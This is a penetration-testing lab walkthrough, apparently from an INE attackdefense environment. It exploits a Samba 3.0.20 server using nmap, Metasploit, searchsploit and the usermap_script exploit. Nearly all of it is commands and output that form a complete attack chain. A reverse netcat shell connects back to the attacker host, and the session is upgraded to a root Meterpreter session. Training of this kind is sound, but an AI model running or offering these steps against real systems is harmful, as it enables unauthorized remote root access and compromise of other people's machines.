# Targeting SAMBA

```sh
root@attackdefense:~# nmap -sV -p 445 10.5.19.32
Starting Nmap 7.92 ( https://nmap.org ) at 2024-01-15 14:02 IST
Nmap scan report for demo.ine.local (10.5.19.32)
Host is up (0.0024s latency).

PORT    STATE SERVICE     VERSION
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
```

```sh
msf6 > search smb_version

Matching Modules                                                                            
================                                                                            
                                                                                            
   #  Name                               Disclosure Date  Rank    Check  Description
   -  ----                               ---------------  ----    -----  -----------
   0  auxiliary/scanner/smb/smb_version                   normal  No     SMB Version Detection
msf6 > use 0
msf6 auxiliary(scanner/smb/smb_version) > set rhosts 10.5.19.32
rhosts => 10.5.19.32
msf6 auxiliary(scanner/smb/smb_version) > run

[*] 10.5.19.32:445        - SMB Detected (versions:1) (preferred dialect:) (signatures:optional)
[*] 10.5.19.32:445        -   Host could not be identified: Unix (Samba 3.0.20-Debian)
[*] 10.5.19.32:           - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

```sh
root@attackdefense:~# searchsploit samba 3.0.20
---------------------------------------------------------- ---------------------------------
 Exploit Title                                            |  Path
---------------------------------------------------------- ---------------------------------
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass    | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command | unix/remote/16320.rb
Samba < 3.0.20 - Remote Heap Overflow                     | linux/remote/7701.txt
Samba < 3.0.20 - Remote Heap Overflow                     | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)             | linux_x86/dos/36741.py
---------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

```sh
msf6 > search samba 3.0.20

Matching Modules
================

   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution

msf6 > use 0
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(multi/samba/usermap_script) > set rhosts 10.5.19.32
rhosts => 10.5.19.32
msf6 exploit(multi/samba/usermap_script) > run

[*] Started reverse TCP handler on 10.10.12.5:4444 
[*] Command shell session 1 opened (10.10.12.5:4444 -> 10.5.19.32:33504 ) at 2024-01-15 14:08:08 +0530

cat /etc/*release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=8.04
DISTRIB_CODENAME=hardy
DISTRIB_DESCRIPTION="Ubuntu 8.04"
```

```sh
msf6 exploit(multi/samba/usermap_script) > sessions

Active sessions
===============

  Id  Name  Type            Information  Connection
  --  ----  ----            -----------  ----------
  1         shell cmd/unix               10.10.12.5:4444 -> 10.5.19.32:33504  (10.5.19.32)

msf6 exploit(multi/samba/usermap_script) > sessions -u 1
[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.10.12.5:4433 
[*] Sending stage (984904 bytes) to 10.5.19.32
[*] Meterpreter session 2 opened (10.10.12.5:4433 -> 10.5.19.32:46044 ) at 2024-01-15 14:09:57 +0530
[*] Command stager progress: 100.00% (773/773 bytes)
msf6 exploit(multi/samba/usermap_script) > sessions

Active sessions
===============

  Id  Name  Type                   Information        Connection
  --  ----  ----                   -----------        ----------
  1         shell cmd/unix                            10.10.12.5:4444 -> 10.5.19.32:33504
                                                       (10.5.19.32)
  2         meterpreter x86/linux  root @ 172.17.0.2  10.10.12.5:4433 -> 10.5.19.32:46044
                                                       (172.17.0.2)
```

```sh
meterpreter > sysinfo
Computer     : 172.17.0.2
OS           : Ubuntu 8.04 (Linux 5.4.0-1048-aws)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > getuid
Server username: root
```
